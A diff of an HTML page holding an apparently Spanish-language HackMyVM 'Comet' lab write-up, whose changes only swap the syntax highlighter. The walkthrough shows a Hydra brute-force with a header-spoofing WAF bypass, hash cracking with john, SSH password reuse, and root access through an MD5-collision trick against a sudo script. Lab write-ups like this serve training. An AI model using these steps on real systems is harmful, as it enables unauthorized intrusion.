@@ -19,7 +19,9 @@
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
     
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <script src="../../assets/highlight/highlight.min.js"></script>
     <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
 </head>
 <body>
@@ -44,7 +46,7 @@ PORT   STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
             <pre class="pre">
-<code class="language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.11
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.11
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
 | ssh-hostkey: 
@@ -64,7 +66,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <img class="img_b" src="../../assets/img/hmv_comet/login.png" alt="login">
             <p>Con gobuster hago una enumeración de extensiones. El archivo<code class="code_negrita">&nbsp;ip.txt&nbsp;</code>es el que usa el cortafuegos para generar una lista negra de direcciones ip.</p>
 <pre class="pre">
-<code class="language-txt">❯ gobuster dir -u 192.168.1.11 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
+<code class="code language-txt">❯ gobuster dir -u 192.168.1.11 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
 
 /images               (Status: 301) [Size: 313] [--> http://192.168.1.11/images/]
 /login.php            (Status: 200) [Size: 1443]                                 
@@ -74,15 +76,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre>
 
             <h3>Bypass WAF</h3>
-<pre class="pre"><code class="language-txt">https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c
+<pre class="pre"><code class="code language-txt">https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c
 </code></pre>
             <p>Atacando el formulario de login con Hydra.</p>
-<pre class="pre"><code class="language-txt">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.11 http-post-form "/login.php:username=^USER^&password=^PASS^:H=x-originating-ip:1.2.3.4:F=Invalid username or password" -V -f -I
+<pre class="pre"><code class="code language-txt">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.11 http-post-form "/login.php:username=^USER^&password=^PASS^:H=x-originating-ip:1.2.3.4:F=Invalid username or password" -V -f -I
 [80][http-post-form] host: 192.168.1.11 login: admin password: s********
 </code></pre>
 
             <p>Una vez conectado veo muchos archivos con la extensión log.</p>
-<pre class="pre"><code class="language-txt">❯ curl -s http://192.168.1.11/logFire/ | html2text
+<pre class="pre"><code class="code language-txt">❯ curl -s http://192.168.1.11/logFire/ | html2text
     
 ****** Index of /logFire ******
 [[ICO]]       Name             Last_modified    Size Description
@@ -99,13 +101,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Apache/2.4.54 (Debian) Server at 192.168.1.11 Port 80
 </code></pre>
             <p>Me descargo<code class="code_negrita">&nbsp;firewall_update&nbsp;</code> y lo lanzo.</p>
-<pre class="pre"><code class="language-txt">❯ ./firewall_update
+<pre class="pre"><code class="code language-txt">❯ ./firewall_update
 Enter password: 123456
 Incorrect password
 </code></pre>
 
             <p>Al tratarse de un binario lo abro con strings. <i class="cursiva">He quitado gran parte de la salida de strings y he dejado el código mas importante para que se vea más claro</i>.</p>
-<pre class="pre"><code class="language-txt">❯ strings -n6 firewall_update
+<pre class="pre"><code class="code language-txt">❯ strings -n6 firewall_update
 SHA256
 b8728ab8H
 1a3c3391H
@@ -122,11 +124,11 @@ GCC: (Debian 12.2.0-14) 12.2.0
 </code></pre>
 
             <p>Creo un archivo con las strings encontradas.</p>
-<pre class="pre"><code class="language-txt">echo "b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1" > hash256
+<pre class="pre"><code class="code language-txt">echo "b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1" > hash256
 </code></pre>
 
             <p>Uso john para romper el hash SHA256.</p>
-<pre class="pre"><code class="language-txt">❯ john hash256 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+<pre class="pre"><code class="code language-txt">❯ john hash256 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
@@ -138,7 +140,7 @@ p*********n      (?)
 
             <p>Vuelvo a lanzar el binario para intoducir la contraseña encontrada con john.</p>
 
-<pre class="pre"><code class="language-txt">❯ ./firewall_update
+<pre class="pre"><code class="code language-txt">❯ ./firewall_update
 Enter password: p*********n
 Firewall successfully updated
 </code></pre>
@@ -146,18 +148,18 @@ Firewall successfully updated
 
 
             <p>La contraseña es válida pero el binario no nos muestra nada mas, así que reutilizo la contraseña para conectarme por ssh. <i class="cursiva">En el archivo firewall.log.37 está el usuario Joe.</i></p>
-<pre class="pre"><code class="language-txt">❯ ssh joe@192.168.1.11
+<pre class="pre"><code class="code language-txt">❯ ssh joe@192.168.1.11
 joe@comet:~$
 </code></pre>
 
             <p>Elevación de privilegios.</p>
-<pre class="pre"><code class="language-txt">joe@comet:~$ sudo -l
+<pre class="pre"><code class="code language-txt">joe@comet:~$ sudo -l
 User joe may run the following commands on comet:
         (ALL : ALL) NOPASSWD: /bin/bash /home/joe/coll
 </code></pre>
 
             <p>Archivo coll.</p>
-<pre class="pre"><code class="language-bash">joe@comet:~$ cat coll
+<pre class="pre"><code class="code language-bash">joe@comet:~$ cat coll
 
 #!/bin/bash
 exec 2>/dev/null
@@ -179,17 +181,17 @@ else
 fi
 </code></pre>
             <p>El script verifica si la primera línea de ambos archivos comienza con el texto "HMV" y si los valores de hash MD5 de ambos archivos son iguales y las condiciones se cumplen, se otorga permiso de ejecución con privilegios elevados (s-bit) al intérprete de bash. Para la creación de los archivos descarga esta herramienta.</p>
-<pre class="pre"><code class="language-txt">https://github.com/cr-marcstevens/hashclash</code></pre>
+<pre class="pre"><code class="code language-txt">https://github.com/cr-marcstevens/hashclash</code></pre>
             <p>Dentro del proyecto tenemos que crear una directorio con el nombre <code class="code_negrita">&nbsp;cpc_workdir&nbsp;</code>nos movemos al nuevo directorio creado para crear el archivo<code class="code_negrita">&nbsp;file1&nbsp;</code>y luego usamos <code class="code_negrita">&nbsp;cpc.sh&nbsp;</code>para crear los archivos.</p>
-<pre class="pre"><code class="language-txt">❯ echo "HMV" > file1
+<pre class="pre"><code class="code language-txt">❯ echo "HMV" > file1
 ❯ ../scripts/poc_no.sh file1</code></pre>
             <p>Cuando la herramienta termina crea dos archivos con extensión .bin, los subo a la máquina objetivo y una vez subidos los renombro a file.</p>
-<pre class="pre"><code class="language-txt">joe@comet:~$ mv collision1.bin file1
+<pre class="pre"><code class="code language-txt">joe@comet:~$ mv collision1.bin file1
 joe@comet:~$ mv collision2.bin file2
 </code></pre>
 
             <p>Compruebo con md5sum que tengan el mismo hash y vuelvo a lanzar el script para obtener el root.</p>
-<pre class="pre"><code class="language-txt">joe@comet:~$ md5sum file*
+<pre class="pre"><code class="code language-txt">joe@comet:~$ md5sum file*
 ff161b97b17351ebc3e7ebb3dbe2180d  file1
 ff161b97b17351ebc3e7ebb3dbe2180d  file2
 joe@comet:~$ sudo /bin/bash /home/joe/coll
@@ -203,7 +205,8 @@ root
     </main>
         <footer class="footer">
             <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
-            <script src="../../assets/js/prism.js"></script> 
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script>
 
         </footer>  
 </body>
